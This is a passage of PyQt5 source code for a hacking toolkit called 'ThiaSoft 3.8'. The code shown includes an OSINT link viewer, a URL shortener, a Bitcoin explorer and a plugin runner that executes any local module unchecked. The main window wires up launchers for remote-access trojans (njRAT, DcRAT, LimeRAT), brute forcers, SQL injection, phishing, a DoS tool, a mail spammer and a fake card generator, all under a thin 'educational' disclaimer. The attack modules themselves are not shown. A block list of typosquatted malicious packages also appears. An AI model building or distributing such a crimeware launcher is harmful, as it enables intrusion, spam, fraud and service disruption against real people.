                    "type": "folder", 
                    "children": [
                        {
                            "name": "Have I Been Pwned",
                            "type": "url",
                            "url": "https://haveibeenpwned.com/"
                        }
                    ]
                }
            ]
        }
        if json_file is None:
            potential_paths = [
                'arf.json', 
                os.path.join(os.path.dirname(__file__), 'arf.json'),
                os.path.join(os.getcwd(), 'arf.json')
            ]
            
            for path in potential_paths:
                if os.path.exists(path):
                    json_file = path
                    break
        
        self.json_file = json_file
        self.init_ui()

    def init_ui(self):
        self.setWindowTitle("OSINT Framework")
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        self.setWindowIcon(QIcon('imgs/osint.png')) 
        self.resize(800, 600)
        layout = QVBoxLayout()
        self.tree = QTreeWidget()
        self.tree.setHeaderLabel("OSINT Resources (Thanks to osintframework.com)")
        self.tree.itemDoubleClicked.connect(self.on_item_double_clicked)
        self.load_json_to_tree()
        layout.addWidget(self.tree)
        self.setLayout(layout)

    def load_json_to_tree(self):
        try:
            if self.json_file and os.path.exists(self.json_file):
                with open(self.json_file, 'r', encoding='utf-8') as file:
                    data = json.load(file)
            else:
                data = self.default_data
                QMessageBox.warning(self, "JSON File Not Found", 
                                    "No OSINT framework JSON file found. Using default data.")
            self.populate_tree_recursive(data, self.tree.invisibleRootItem())
            for i in range(self.tree.topLevelItemCount()):
                self.tree.topLevelItem(i).setExpanded(True)

        except Exception as e:
            QMessageBox.critical(self, "Error", f"Error loading JSON: {e}")
            data = self.default_data
            self.populate_tree_recursive(data, self.tree.invisibleRootItem())

    def populate_tree_recursive(self, item_data, parent_item):
        tree_item = QTreeWidgetItem(parent_item)
        tree_item.setText(0, item_data.get('name', 'Unnamed'))
        if 'url' in item_data:
            tree_item.setToolTip(0, item_data['url'])
        if 'children' in item_data:
            for child in item_data['children']:
                self.populate_tree_recursive(child, tree_item)

    def on_item_double_clicked(self, item, column):
        url = item.toolTip(0)
        if url and (url.startswith('http://') or url.startswith('https://')):
            webbrowser.open(url)


class UrlShortener(QDialog):
    def __init__(self):
        super().__init__()
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        self.init_ui()

    def init_ui(self):
        self.setWindowTitle("URL Shortener")
        self.setWindowIcon(QIcon('imgs/urlshort.png'))
        self.setFixedSize(600, 450)
        main_layout = QVBoxLayout()
        header_layout = QHBoxLayout()
        title_label = QLabel("URL Shortener")
        title_label.setStyleSheet("font-size: 18px; font-weight: bold; color: #333333;")
        header_layout.addWidget(title_label)
        header_layout.addSpacerItem(QSpacerItem(40, 20, QSizePolicy.Expanding, QSizePolicy.Minimum)) 
        main_layout.addLayout(header_layout)
        input_layout = QVBoxLayout()
        
        self.link_label = QLabel("Enter URL:")
        self.link_label.setStyleSheet("font-size: 14px; color: #333333;")
        input_layout.addWidget(self.link_label)
        self.link_entry = QLineEdit()
        self.link_entry.setPlaceholderText("Enter the URL to shorten")
        self.link_entry.setStyleSheet("padding: 10px; font-size: 14px; border-radius: 5px; border: 1px solid #aaa;")
        input_layout.addWidget(self.link_entry)
        main_layout.addLayout(input_layout)
        button_layout = QHBoxLayout()
        self.shorten_button = QPushButton("Shorten URL")
        self.shorten_button.setStyleSheet("background-color: black; color: white; padding: 10px 20px; border-radius: 5px; border: 2px solid blue;")
        self.shorten_button.clicked.connect(self.shorten_url)
        button_layout.addWidget(self.shorten_button)
        
        self.clear_button = QPushButton("Clear")
        self.clear_button.setStyleSheet("background-color: black; color: white; padding: 10px 20px; border-radius: 5px; border: 2px solid blue;")
        self.clear_button.clicked.connect(self.clear_fields)
        button_layout.addWidget(self.clear_button)
        button_layout.setSpacing(20)
        main_layout.addLayout(button_layout)
        self.result_label = QLabel("Shortened URL will appear here.")
        self.result_label.setStyleSheet("font-size: 14px; color: #555555; padding-top: 20px;")
        main_layout.addWidget(self.result_label)

        self.copy_button = QPushButton("Copy to Clipboard")
        self.copy_button.setStyleSheet("background-color: black; color: white; padding: 10px 20px; border-radius: 5px; border: 2px solid blue;")
        self.copy_button.clicked.connect(self.copy_to_clipboard)
        self.copy_button.setEnabled(False)
        main_layout.addWidget(self.copy_button, alignment=Qt.AlignCenter)

        self.setLayout(main_layout)

    def shorten_url(self):
        url = self.link_entry.text().strip()
        if not url:
            QMessageBox.warning(self, "Error", "Please enter a URL.")
            return
        
        self.worker = UrlShortenerWorker(url)
        self.worker.finished.connect(self.on_url_shortened)
        self.worker.start()

    def on_url_shortened(self, shortened_url):
        if shortened_url:
            self.result_label.setText(f"Shortened URL: {shortened_url}")
            self.copy_button.setEnabled(True)
        else:
            QMessageBox.critical(self, "Error", "Failed to shorten the URL.")

    def clear_fields(self):
        self.link_entry.clear()
        self.result_label.setText("Shortened URL will appear here.")
        self.copy_button.setEnabled(False)

    def copy_to_clipboard(self):
        clipboard = QApplication.clipboard()
        clipboard.setText(self.result_label.text().replace("Shortened URL: ", "").strip())
        QMessageBox.information(self, "Copied", "Shortened URL copied to clipboard!")

class UrlShortenerWorker(QThread):
    finished = pyqtSignal(str)

    def __init__(self, url):
        super().__init__()
        self.url = url

    def run(self):
        try:
            api_url = f"https://tinyurl.com/api-create.php?url={self.url}"
            response = requests.get(api_url)
            response.raise_for_status()
            self.finished.emit(response.text)
        except requests.exceptions.RequestException:
            self.finished.emit("")

class BitcoinBlockExplorer(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.init_ui()

    def init_ui(self):
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        self.setWindowTitle("Bitcoin Block Explorer")
        self.setWindowIcon(QIcon('imgs/bitcoin_block.png'))
        self.setFixedSize(600, 650)

        main_layout = QVBoxLayout()
        address_layout = QVBoxLayout()
        self.address_entry = QLineEdit()
        self.address_entry.setPlaceholderText("Enter Bitcoin address")
        address_layout.addWidget(QLabel("Bitcoin Address:"))
        address_layout.addWidget(self.address_entry)
        main_layout.addLayout(address_layout)

        self.results_area = QTextEdit()
        self.results_area.setReadOnly(True)
        main_layout.addWidget(self.results_area)

        button_layout = QHBoxLayout()
        self.start_button = QPushButton("Explore Block")
        self.start_button.clicked.connect(self.start_exploring)
        button_layout.addStretch()
        button_layout.addWidget(self.start_button)
        button_layout.addStretch()
        main_layout.addLayout(button_layout)

        self.setLayout(main_layout)

    def start_exploring(self):
        address = self.address_entry.text().strip()

        if not address:
            QMessageBox.warning(self, "Input Error", "Please enter a Bitcoin address.")
            return

        self.results_area.clear()
        self.results_area.append(f"Exploring Bitcoin address: {address}\n")

        try:
            self.explore_bitcoin_address(address)
        except Exception as e:
            self.results_area.append(f"[ERROR] An error occurred: {str(e)}\n")

    def explore_bitcoin_address(self, address):
        try:
            url = f"https://blockchain.info/rawaddr/{address}"
            response = requests.get(url)

            if response.status_code == 200:
                data = response.json()
                balance = data['final_balance'] / 10**8
                total_received = data['total_received'] / 10**8
                total_sent = data['total_sent'] / 10**8
                tx_count = data['n_tx']
                
                self.results_area.append(f"Balance: {balance} BTC")
                self.results_area.append(f"Total Received: {total_received} BTC")
                self.results_area.append(f"Total Sent: {total_sent} BTC")
                self.results_area.append(f"Number of Transactions: {tx_count}")

                self.results_area.append("\nTransactions:")
                for tx in data['txs']:
                    tx_hash = tx['hash']
                    tx_time = tx['time']
                    tx_value = tx['result'] / 10**8
                    self.results_area.append(f"Tx Hash: {tx_hash}")
                    self.results_area.append(f"Time: {tx_time}")
                    self.results_area.append(f"Value: {tx_value} BTC")
                    self.results_area.append("-----------------------------")
            else:
                self.results_area.append(f"[ERROR] Failed to fetch data for Bitcoin address: {response.status_code}")
        except Exception as e:
            self.results_area.append(f"[ERROR] An error occurred: {str(e)}")


class PluginSystem(QDialog):
    def __init__(self):
        super().__init__()
        # Remove the previous setWindowFlags line and set new flags
        self.setWindowFlags(Qt.Window | Qt.WindowMinimizeButtonHint | Qt.WindowCloseButtonHint)
        self.setWindowTitle("Plugin Manager")
        self.setWindowIcon(QIcon('imgs/plugins.png'))
        self.setMinimumSize(600, 450)  
        self.plugin_dir = "plugins"
        self.plugins = []
        self.malicious_dependencies = {
            "python3-dateutil",  # Похищала ключи SSH и GPG 
            "jeIlyfish",         # Похищала ключи SSH и GPG 
            "urllib",            # Маскировалась под urllib3
            "urlib3",            # Маскировалась под urllib3 
            "beautifulsup4",     # Маскировалась под beautifulsoup4 
            "cryptograpyh",      # Маскировалась под cryptography 
            "djangoo",           # Маскировалась под django 
            "pytagora",          # Содержала обфусцированный вредоносный код 
            "pytagora2",         # Содержала обфусцированный вредоносный код 
            "dpp-client",        # Содержала вредоносный код 
            "aws-login0tool",    # Содержала вредоносный код
        }

        self.load_plugins()
        self.plugin_timer = QTimer(self)
        self.plugin_timer.timeout.connect(self.checkpl)
        self.plugin_timer.start(1000)

        self.init_ui()

    def init_ui(self):
        main_layout = QVBoxLayout()
        header_layout = QHBoxLayout()
        title_label = QLabel("Plugin System")
        title_label.setStyleSheet("font-size: 18px; font-weight: bold; color: #333333;")
        header_layout.addWidget(title_label)
        header_layout.addSpacerItem(QSpacerItem(40, 20, QSizePolicy.Expanding, QSizePolicy.Minimum)) 
        main_layout.addLayout(header_layout)
        
        self.plugin_list = QListView()
        self.plugin_model = QStringListModel()
        self.plugin_model.setStringList(self.plugins)
        self.plugin_list.setModel(self.plugin_model)
        self.plugin_list.setSelectionMode(QListView.SingleSelection)
        main_layout.addWidget(self.plugin_list)
        
        button_layout = QHBoxLayout()
        self.run_button = QPushButton("Run Plugin")
        self.run_button.setStyleSheet("background-color: black; color: white; padding: 10px 20px; border-radius: 5px;")
        self.run_button.clicked.connect(self.run_plugin)
        button_layout.addWidget(self.run_button)

        self.delete_button = QPushButton("Delete Plugin")
        self.delete_button.setStyleSheet("background-color: black; color: white; padding: 10px 20px; border-radius: 5px;")
        self.delete_button.clicked.connect(self.delete_plugin)
        button_layout.addWidget(self.delete_button)

        button_layout.setSpacing(20)
        main_layout.addLayout(button_layout)

        self.setLayout(main_layout)

    def load_plugins(self):
        if not os.path.exists(self.plugin_dir):
            os.makedirs(self.plugin_dir)
        self.plugins = []
        for filename in os.listdir(self.plugin_dir):
            if filename.endswith(".py"):
                self.plugins.append(filename[:-3]) 

    def checkpl(self):
        current_plugins = []
        for filename in os.listdir(self.plugin_dir):
            if filename.endswith(".py"):
                current_plugins.append(filename[:-3]) 

        if set(current_plugins) != set(self.plugins):
            self.plugins = current_plugins
            self.plugin_model.setStringList(self.plugins)

    def run_plugin(self):
        selected_plugin_index = self.plugin_list.selectedIndexes()
        if not selected_plugin_index:
            QMessageBox.warning(self, "Error", "Please select a plugin to run.")
            return

        plugin_name = self.plugins[selected_plugin_index[0].row()]
        try:
            plugin = importlib.import_module(f"plugins.{plugin_name}")
            plugin.run()  
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to run plugin: {e}")

    def delete_plugin(self):
        selected_plugin_index = self.plugin_list.selectedIndexes()
        if not selected_plugin_index:
            QMessageBox.warning(self, "Error", "Please select a plugin to delete.")
            return

        plugin_name = self.plugins[selected_plugin_index[0].row()]
        plugin_file = os.path.join(self.plugin_dir, f"{plugin_name}.py")
        
        confirm = QMessageBox.question(self, "Delete Plugin", f"Are you sure you want to delete plugin '{plugin_name}'?", QMessageBox.Yes | QMessageBox.No)
        if confirm == QMessageBox.Yes:
            try:
                os.remove(plugin_file)
                self.plugins.remove(plugin_name)
                self.plugin_model.setStringList(self.plugins)
                QMessageBox.information(self, "Deleted", f"Plugin '{plugin_name}' has been deleted.")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to delete plugin: {e}")

# ВСЕ КЕЙБИНДЫ ВРЕМЕННО ЗАБИНДЖЕННЫ НА "Ctrl+SHIF+M", ЭТО СОЗДАННО ДЛЯ ИХ СКРЫТИЯ 
class InvestigatorTool(QMainWindow):
    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):
        self.setWindowTitle('ThiaSoft 3.8')
        self.setGeometry(300, 300, 1070, 700)
        self.setWindowIcon(QIcon('imgs/icon.png'))
        self.setStyle(QStyleFactory.create('Fusion'))
        palette = QPalette()
        pure_black = QColor(0, 0, 0)
        light_text = QColor(220, 220, 240) 
        accent_color = QColor(62, 120, 238) 
        
        palette.setColor(QPalette.Window, pure_black)
        palette.setColor(QPalette.WindowText, light_text)
        palette.setColor(QPalette.Base, pure_black)
        palette.setColor(QPalette.AlternateBase, pure_black)
        palette.setColor(QPalette.ToolTipBase, pure_black)
        palette.setColor(QPalette.ToolTipText, light_text)
        palette.setColor(QPalette.Text, light_text)
        palette.setColor(QPalette.Button, pure_black)
        palette.setColor(QPalette.ButtonText, light_text)
        palette.setColor(QPalette.BrightText, QColor(255, 100, 100))
        palette.setColor(QPalette.Link, accent_color)
        palette.setColor(QPalette.Highlight, accent_color)
        palette.setColor(QPalette.HighlightedText, QColor(255, 255, 255))
        
        self.setPalette(palette)
        self.setStyleSheet("""
            QMainWindow {
                background-color: black;
                border: 1px solid #3E78EE;
                border-radius: 8px;
            }
            QWidget {
                font-family: 'Roboto', 'Arial', sans-serif;
                color: #DCE0E8;
                background-color: transparent;
            }
        """)

        menubar = self.menuBar()
        menubar.setStyleSheet("""
            QMenuBar {
                background-color: black;
                color: #DCE0E8;
                border-bottom: 1px solid #3E78EE;
                padding: 4px;
                font-weight: 500;
            }
            QMenuBar::item {
                spacing: 5px;
                padding: 4px 12px;
                background-color: transparent;
                border-radius: 4px;
            }
            QMenuBar::item:selected {
                background-color: #3E78EE;
                color: white;
            }
            QMenu {
                background-color: black;
                color: #DCE0E8;
                border: 1px solid #3E78EE;
                border-radius: 6px;
                padding: 4px;
            }
            QMenu::item {
                padding: 6px 20px;
                border-radius: 4px;
            }
            QMenu::item:selected {
                background-color: #3E78EE;
                color: white;
            }
        """)

        self.menu_font = QFont("Roboto", 10)  
        self.menu_font1 = QFont("Roboto", 10, QFont.Bold)
        
        # Мейн меню
        fileMenu = menubar.addMenu('Main')
        self.add_menu_item(fileMenu, 'Plugins', 'imgs/plugins.png', 'Ctrl+SHIF+M', self.show_plugin)
        self.add_menu_item(fileMenu, 'About', 'imgs/about.png', 'Ctrl+SHIF+M', self.show_dialog)
        self.add_menu_item(fileMenu, 'Exit', 'imgs/exit.png', 'Ctrl+SHIF+M', self.close)

        # Меню контактов
        socialMenu = menubar.addMenu('Contact')
        self.add_menu_item(socialMenu, 'We on Telegram', 'imgs/telegram.png', 'Ctrl+SHIF+M', self.show_tg)
        self.add_menu_item(socialMenu, 'We on YouTube', 'imgs/youtube.png', 'Ctrl+SHIF+M', self.show_yt)

        # Меню инструментов
        toolsMenu = menubar.addMenu('Tools')
        self.add_menu_item(toolsMenu, 'WI-FI Analyzer', 'imgs/wifi.png', 'Ctrl+SHIF+M', self.show_wifi)
        self.add_menu_item(toolsMenu, 'Web Scraper', 'imgs/scraper.png', 'Ctrl+SHIF+M', self.show_web_scraper)
        self.add_menu_item(toolsMenu, 'SMTP Mailer', 'imgs/smtp.png', 'Ctrl+SHIF+M', self.show_smtp_reporter)
        self.add_menu_item(toolsMenu, 'Proxy Scraper', 'imgs/proxy.png', 'Ctrl+SHIF+M', self.show_proxy_scraper)
        self.add_menu_item(toolsMenu, 'Proxy Checker', 'imgs/proxy_checker.png', 'Ctrl+SHIF+M', self.show_proxych)
        self.add_menu_item(toolsMenu, 'Subdomain Enumerator', 'imgs/subdomain.png', 'Ctrl+SHIF+M', self.show_subd)
        
        # Меню крипто
        cryptoMenu = menubar.addMenu('Crypto')
        self.add_menu_item(cryptoMenu, 'Crypto Checker', 'imgs/crypto_checker.png', 'Ctrl+SHIF+M', self.show_cryptock)
        self.add_menu_item(cryptoMenu, 'BTC-Block Explorer', 'imgs/bitcoin_block.png', 'Ctrl+SHIF+M', self.show_btc)

        # Меню ратов
        remoteAccessMenu = menubar.addMenu('Rats')
        self.add_menu_item(remoteAccessMenu, 'Njrat', 'imgs/njrat.png', 'Ctrl+SHIF+M', self.show_njrat)
        self.add_menu_item(remoteAccessMenu, 'DcRat', 'imgs/dcrat.png', 'Ctrl+SHIF+M', self.show_teleshadow)
        self.add_menu_item(remoteAccessMenu, 'LimeRat', 'imgs/limerat.png', 'Ctrl+SHIF+M', self.show_eagly)

        bruteMenu = menubar.addMenu('BruteForcers')
        self.add_menu_item(bruteMenu, 'FTP BruteForce', 'imgs/ftpcheck.png', 'Ctrl+SHIF+M', self.show_ftpcheck)
        self.add_menu_item(bruteMenu, 'SMTP BruteForce', 'imgs/smtpcheck.png', 'Ctrl+SHIF+M', self.show_smtpcheck)
        self.add_menu_item(bruteMenu, 'WordPress BruteForce', 'imgs/wordcheck.png', 'Ctrl+SHIF+M', self.show_wordcheck)
        self.add_menu_item(bruteMenu, 'Web-Form BruteForce', 'imgs/bruteforce.png', 'Ctrl+SHIF+M', self.show_brute)

        # Меню хакинга
        securityMenu = menubar.addMenu('Hacking')
        self.add_menu_item(securityMenu, 'Nmap', 'imgs/nmap.png', 'Ctrl+SHIF+M', self.show_nmap_tool)
        self.add_menu_item(securityMenu, 'SQL Injection', 'imgs/sqlinject.png', 'Ctrl+SHIF+M', self.show_sqlinject)
        self.add_menu_item(securityMenu, 'Dorking Searcher', 'imgs/dorking.png', 'Ctrl+SHIF+M', self.show_dork)
        self.add_menu_item(securityMenu, 'Shodan Scan', 'imgs/shodan.png', 'Ctrl+SHIF+M', self.show_shodan)
        self.add_menu_item(securityMenu, 'Phishing', 'imgs/fishing.png', 'Ctrl+SHIF+M', self.show_fish)
        self.add_menu_item(securityMenu, 'XSS Scan', 'imgs/xss.png', 'Ctrl+SHIF+M', self.show_xss_tool)
        self.add_menu_item(securityMenu, 'DoS Attack', 'imgs/dos.png', 'Ctrl+SHIF+M', self.show_dos_tool)

        # Меню поиска
        osintMenu = menubar.addMenu('Osint')
        self.add_menu_item(osintMenu, 'IP Info', 'imgs/ipinfo.png', 'Ctrl+SHIF+M', self.show_ip_info)
        self.add_menu_item(osintMenu, 'OSINT Framework', 'imgs/osint.png', 'Ctrl+SHIF+M', self.show_osint_framework)
        self.add_menu_item(osintMenu, 'Phone Search', 'imgs/phone.png', 'Ctrl+SHIF+M', self.show_phone)
        self.add_menu_item(osintMenu, 'Database Search', 'imgs/osintsearch.png', 'Ctrl+SHIF+M', self.show_osint_database_search)
        
        Socialemenu = menubar.addMenu('Social')
        self.add_menu_item(Socialemenu, 'QR-Code Manager', 'imgs/qrcode.png', 'Ctrl+SHIF+M', self.show_qrcode)
        self.add_menu_item(Socialemenu, 'URL Shortener', 'imgs/urlshort.png', 'Ctrl+SHIF+M', self.show_url)
        self.add_menu_item(Socialemenu, 'Mail Spammer', 'imgs/emailspammer.png', 'Ctrl+SHIF+M', self.show_email_spammer)

        # Меню генераторов
        generatorsMenu = menubar.addMenu('Generators')
        self.add_menu_item(generatorsMenu, 'Random Personality', 'imgs/random_personality.png', 'Ctrl+SHIF+M', self.show_random_personality)
        self.add_menu_item(generatorsMenu, 'User-Agent', 'imgs/useragent.png', 'Ctrl+SHIF+M', self.show_user_agent_generator)
        self.add_menu_item(generatorsMenu, 'Fake Card', 'imgs/fakecard.png', 'Ctrl+SHIF+M', self.show_fake_card)
        self.add_menu_item(generatorsMenu, 'Password', 'imgs/passwordgen.png', 'Ctrl+SHIF+M', self.show_password_generator)

        auth_dialog = AuthenticationDialog()
        if auth_dialog.exec_() != QDialog.Accepted:
            sys.exit()

        self.central_widget = QWidget()
        self.setCentralWidget(self.central_widget)

        self.web_animation = WebAnimation()
        layout = QVBoxLayout(self.central_widget)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.addWidget(self.web_animation, stretch=1)

        self.show()

    def add_menu_item(self, menu, name, icon_path, shortcut, callback):
        action = QAction(QIcon(icon_path), name, self)
        action.setShortcut(shortcut)
        action.triggered.connect(callback)
        action.setFont(self.menu_font)
        menu.addAction(action)
        menu.setFont(self.menu_font1)

    def show_cryptock(self):
        cryptock = CryptoWalletChecker()
        cryptock.exec()

    def show_wifi(self):
        wifi = WiFiAnalyzer()
        wifi.exec()

    def show_btc(self):
        btc = BitcoinBlockExplorer()
        btc.exec()

    def show_plugin(self):
        plugin = PluginSystem()
        plugin.exec()
    

    def show_qrcode(self):
        qrcode_dialog = QrCodeGenerator()
        qrcode_dialog.exec()

    def show_osint_framework(self):
        osint_framework = OsintFrameworkViewer()
        osint_framework.exec()

    def show_password_generator(self):
        password_generator = PasswordGenerator()
        password_generator.exec()

    def show_wordcheck(self):
        wordcheck = WordpressChecker()
        wordcheck.exec() 

    def show_shodan(self):
        shodan = ShodanScanner()
        shodan.exec()

    def show_dialog(self):
        dialog = About('''The developer is not responsible for your actions.
Only use this tool for educational purposes.
Our Telegram channel: @thiasoft
Developer - RENC(https://github.com/FelixFoxf)
                MADE WITH LOVE ❤️''')
        dialog.exec_()
        
    def show_subd(self):
        subd = SubdomainEnumerator()
        subd.exec() 
        
    def show_proxych(self):
        prxy = ProxyChecker()
        prxy.exec()
        
    def show_url(self):
        url = UrlShortener()
        url.exec()

    def show_smtpcheck(self):
        smtpcheck = SMTPCracker()
        smtpcheck.exec()
        
    def show_brute(self):
        brute = WebFormBruteforcer()
        brute.exec() 
        
    def show_smtp_reporter(self):
        smtp_reporter = SMTPReporter()
        smtp_reporter.exec_()

    def show_email_spammer(self):
        email_spammer = EmailSpammer()
        email_spammer.exec()
        
    def show_dork(self):
        dork = DorkingSearch()
        dork.exec_()
        
    def show_phone(self):
        phone = PhoneNumberAnalyzer()
        phone.exec_()
        
    def show_sqlinject(self):
        sqlinject = SQLiTester()
        sqlinject.exec()
        
    def show_fish(self):
        fish = Fishing()
        fish.exec()


    def show_proxy_scraper(self):
        proxy_scraper = ProxyScraper()
        proxy_scraper.exec_()
        
    def show_njrat(self):
        njrat = NjratMain()
        njrat.launch_app()
    
    def show_eagly(self):
        eagly = Eagly()
        eagly.launch_app()
    
    def show_teleshadow(self):
        teleshadow = TeleShadow()
        teleshadow.launch_app()
        
    def show_crypto(self):
        crypto = CryptoGrab()
        crypto.launch_app()
        
    def show_user_agent_generator(self):
        user_agent_dialog = UserAgentGenerator()
        user_agent_dialog.exec_()
        
    def show_dos_tool(self):
        dos_tool = DoSTool()
        dos_tool.exec_()
        
    def show_xss_tool(self):
        xss_tool = XSSScannerApp()
        xss_tool.exec_()

    def show_nmap_tool(self):
        nmap_tool = NmapTool()
        nmap_tool.exec_()

    def show_yt(self):
        url = "https://www.youtube.com/@thiasoft"
        QDesktopServices.openUrl(QUrl(url))
        
    def show_tg(self):
        url = "https://t.me/thiasoft"
        QDesktopServices.openUrl(QUrl(url))
    
    # Варден отъебись, мне лень переименовывать функции 

    def show_ip_info(self):
        ip_info = IPInfo()
        ip_info.exec_()

    def show_osint_database_search(self):
        osint_database_search = OSINTDatabaseSearch()
        osint_database_search.exec_()
        
    def show_ftpcheck(self):
        ftpcheck = FTPCracker()
        ftpcheck.exec_()
        
    def show_web_scraper(self):
        web_scraper = WebScraper()
        web_scraper.exec_()

    def show_random_personality(self):
        personality = generate_personality()
        message = "\n".join([f"{key.capitalize()}: {value}" for key, value in personality.items()])
        QMessageBox.information(self, "Random Personality", message)
        
    def show_fake_card(self):
        card = generate_fake_card()
        message = (f"Type: {card['type']}\n"
                   f"Number: {card['number']}\n"
                   f"Expiry Date: {card['expiry_date']}\n"
                   f"CVV: {card['cvv']}\n"
                   f"Issuer: {card['issuer']}\n"
                   f"Cardholder: {card['cardholder_name']}")
        QMessageBox.information(self, "Fake Card", message)
        
    def keyPressEvent(self, event):
        if event.key() == Qt.Key_F11:
            if self.isFullScreen():
                self.showNormal()
            else:
                self.showFullScreen()
        super().keyPressEvent(event)

# 3:29 ночи а я пишу эту ёбанную обнову. 19.08.2024
# 19:36, скоро новый год, обновляю софтик после месячного перерыва. 14.12.2024
# 2:54 ночи, просто фикшу баги(наконец-то), интересно найдётся ли кто-то, кто будет читать этот код. 21.12.2024
if __name__ == '__main__':
    app = QApplication(sys.argv)
    app.setStyle('Fusion')
    palette = app.palette()
    palette.setColor(palette.Window, Qt.black)
    palette.setColor(palette.WindowText, Qt.white)
    palette.setColor(palette.Base, Qt.black)
    palette.setColor(palette.AlternateBase, Qt.gray)
    palette.setColor(palette.ToolTipBase, Qt.white)
    palette.setColor(palette.ToolTipText, Qt.white)
    palette.setColor(palette.Text, Qt.white)
    palette.setColor(palette.Button, Qt.black)
    palette.setColor(palette.ButtonText, Qt.white)
    palette.setColor(palette.BrightText, Qt.red)
    palette.setColor(palette.Highlight, Qt.blue)
    palette.setColor(palette.HighlightedText, Qt.black)
    app.setPalette(palette)
    mainWin = InvestigatorTool()
    sys.exit(app.exec_())
